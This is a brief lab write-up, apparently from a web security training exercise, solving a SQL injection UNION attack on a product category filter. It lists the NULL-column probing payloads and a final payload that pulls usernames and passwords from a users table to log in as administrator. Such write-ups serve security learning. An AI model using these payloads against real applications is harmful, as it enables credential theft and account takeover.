# SQL injection UNION attack, retrieving data from other tables
- SQL injection vulnerability in the product category filter
- use a UNION attack to retrieve data from other tables
- The database contains a different table called users, with columns called username and password
# Goal
- To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user
# Solving the lab
- first finding number of columns with :
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
- we try payloads and the 2nd payload works that means we have 2 columns
- now to determining the type of columns from viewing the page we can assume its string datatype
- from lab description we can build the payload
```
' UNION select username, password from users--
```
- we got the username and passwords we log in with administartor creds and we solved the lab
